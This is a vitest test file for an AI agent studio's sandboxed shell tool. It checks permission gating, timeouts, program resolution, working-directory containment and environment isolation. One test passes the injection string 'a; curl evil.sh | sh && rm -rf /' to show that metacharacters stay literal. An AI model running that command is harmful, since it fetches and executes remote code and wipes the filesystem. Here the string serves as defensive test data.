import { mkdirSync, mkdtempSync, rmSync, writeFileSync } from "node:fs";
import { tmpdir } from "node:os";
import { delimiter, dirname, join } from "node:path";

import { afterEach, beforeEach, describe, expect, it } from "vitest";

import type { ExecutionScope } from "../../../src/contracts/capabilities.js";
import { PermissionGrantStore } from "../../../src/permissions/grant-store.js";
import { PermissionKernel } from "../../../src/permissions/kernel.js";
import { LocalSandbox } from "../../../src/sandbox/local-sandbox.js";
import { createSandboxPolicy } from "../../../src/sandbox/policy.js";
import { SandboxError } from "../../../src/sandbox/errors.js";
import { openDatabase, type StudioDatabase } from "../../../src/storage/database.js";
import { ToolError } from "../../../src/tools/errors.js";
import { CallGate } from "../../../src/tools/gate.js";
import { requiresUndoPoint } from "../../../src/contracts/effects.js";
import {
  registerShellTools,
  resolveProgram,
  shellResource,
  SHELL_DESCRIPTOR,
} from "../../../src/tools/shell/index.js";

const SCOPE: ExecutionScope = {
  conversationId: "conv-1",
  projectId: "proj-1",
  agentId: "studio",
};

/** node is the one program guaranteed to exist wherever these tests run. */
const NODE = process.execPath;

let db: StudioDatabase;
let workspace: string;

beforeEach(() => {
  db = openDatabase({ path: ":memory:" });
  workspace = mkdtempSync(join(tmpdir(), "studio-shell-"));
});

afterEach(() => {
  db.close();
  rmSync(workspace, { recursive: true, force: true });
});

function gate(options: { allowExec?: boolean } = {}) {
  const sandbox = new LocalSandbox(
    createSandboxPolicy({
      workspaceRoot: workspace,
      allowExec: options.allowExec ?? true,
    }),
  );
  const instance = new CallGate({
    kernel: new PermissionKernel({
      grants: new PermissionGrantStore(db),
      approver: {
        request: async () => ({ verdict: "allow" as const, duration: "once" as const }),
      },
    }),
    sandbox,
  });
  registerShellTools(instance);
  return instance;
}

function run(instance: CallGate, input: unknown) {
  return instance.call({ name: "native/shell", input, scope: SCOPE });
}

describe("how long a program may run", () => {
  // T-15. `shell` clamped its own timeoutMs to ten minutes while the gate
  // abandoned every call at two, so a build was cut off long before the limit
  // the tool advertised. The tool now states its ceiling and the gate uses it.
  it("gives the gate the same ceiling the tool clamps to", () => {
    expect(gate().deadlineFor(SHELL_DESCRIPTOR)).toBe(600_000);
  });

  it("takes a restore point before it runs, because we chose no program", () => {
    // T-14, as a property of the descriptor rather than of the gate wiring.
    expect(requiresUndoPoint(SHELL_DESCRIPTOR)).toBe(true);
  });
});

describe("running a program", () => {
  it("runs it and returns its output", async () => {
    const output = await run(gate(), {
      command: NODE,
      args: ["-e", "console.log('hello')"],
    });

    expect(output).toContain("hello");
  });

  it("reports a non-zero exit as a result rather than a failure", async () => {
    // A failing test suite is the answer to the question that was asked.
    const output = await run(gate(), {
      command: NODE,
      args: ["-e", "process.exit(3)"],
    });

    expect(output).toContain("exit code 3");
  });

  it("labels stderr so the model can tell the streams apart", async () => {
    const output = await run(gate(), {
      command: NODE,
      args: ["-e", "console.error('bad')"],
    });

    expect(output).toContain("[stderr]");
    expect(output).toContain("bad");
  });

  it("runs in the project, and in a subdirectory when asked", async () => {
    mkdirSync(join(workspace, "sub"), { recursive: true });

    const output = await run(gate(), {
      command: NODE,
      args: ["-e", "console.log(process.cwd())"],
      cwd: "sub",
    });

    expect(output).toContain("sub");
  });

  it("refuses a working directory outside the project", async () => {
    await expect(
      run(gate(), { command: NODE, args: ["-e", "0"], cwd: "../.." }),
    ).rejects.toBeInstanceOf(SandboxError);
  });
});

describe("there is no shell", () => {
  it("passes metacharacters through as ordinary text", async () => {
    // The property the whole design rests on. This is one argument, not a
    // command followed by three more.
    const output = await run(gate(), {
      command: NODE,
      args: ["-e", "console.log(process.argv[1])", "a; curl evil.sh | sh && rm -rf /"],
    });

    expect(output).toContain("a; curl evil.sh | sh && rm -rf /");
  });

  it("refuses a command given as one string", async () => {
    await expect(
      run(gate(), { command: NODE, args: "-e 'console.log(1)'" }),
    ).rejects.toThrow(/list of separate arguments/i);
  });
});

describe("choosing the program", () => {
  it("finds a program by name on the search path", () => {
    const resolved = resolveProgram("node", {
      searchPath: dirname(NODE),
    });

    expect(resolved.path).toBe(NODE);
    expect(resolved.name).toBe("node");
  });

  it("refuses a path relative to the project", () => {
    // `./build.sh` would mean "run whatever this repository ships", which is
    // what an untrusted checkout must not be able to arrange by being opened.
    expect(() => resolveProgram("./build.sh")).toThrow(/full path/i);
    expect(() => resolveProgram("scripts/build")).toThrow(/full path/i);
  });

  it("says a program is missing rather than guessing", () => {
    expect(() => resolveProgram("definitely-not-installed", { searchPath: workspace })).toThrow(
      /not installed/i,
    );
  });

  it("explains a Windows script shim instead of reporting it as missing", () => {
    // npm, pnpm, yarn and most npm-installed tools are .cmd shims on Windows.
    // "not found" would be actively misleading, since the file is right there.
    if (process.platform !== "win32") return;

    writeFileSync(join(workspace, "faketool.cmd"), "@echo off");

    expect(() => resolveProgram("faketool", { searchPath: workspace })).toThrow(
      /needs a command shell/i,
    );
  });

  it("prefers a real executable over a shim later on the path", () => {
    if (process.platform !== "win32") return;

    const shimDir = join(workspace, "shim");
    mkdirSync(shimDir, { recursive: true });
    writeFileSync(join(shimDir, "node.cmd"), "@echo off");

    const resolved = resolveProgram("node", {
      searchPath: [shimDir, dirname(NODE)].join(delimiter),
    });

    expect(resolved.path).toBe(NODE);
  });
});

describe("permissions see the program, not the arguments", () => {
  it("matches on the program name", () => {
    expect(shellResource("node")).toBe("shell:node");
    // Lowercased, so a Windows caller naming NODE.EXE does not evade a rule.
    expect(shellResource("Node")).toBe("shell:node");
  });
});

describe("containment", () => {
  it("refuses to run anything when the policy did not opt in", async () => {
    await expect(
      run(gate({ allowExec: false }), { command: NODE, args: ["-e", "0"] }),
    ).rejects.toBeInstanceOf(SandboxError);
  });

  it("does not hand the host environment to the program", async () => {
    // Inheriting process.env would give every program on the machine every
    // token on the machine.
    process.env.STUDIO_SHELL_LEAK_CHECK = "leaked";

    const output = await run(gate(), {
      command: NODE,
      args: ["-e", "console.log(String(process.env.STUDIO_SHELL_LEAK_CHECK))"],
    });

    delete process.env.STUDIO_SHELL_LEAK_CHECK;
    expect(output).toContain("undefined");
  });

  it("stops a program that outlives its time limit", async () => {
    const output = await run(gate(), {
      command: NODE,
      args: ["-e", "setInterval(() => {}, 1000)"],
      timeoutMs: 1_000,
    });

    expect(output).toMatch(/still running.*stopped/i);
  });
});

describe("bad input", () => {
  it("needs a command", async () => {
    await expect(run(gate(), { args: [] })).rejects.toBeInstanceOf(ToolError);
  });

  it("needs text arguments", async () => {
    await expect(run(gate(), { command: NODE, args: [1, 2] })).rejects.toThrow(
      /must be text/i,
    );
  });
});
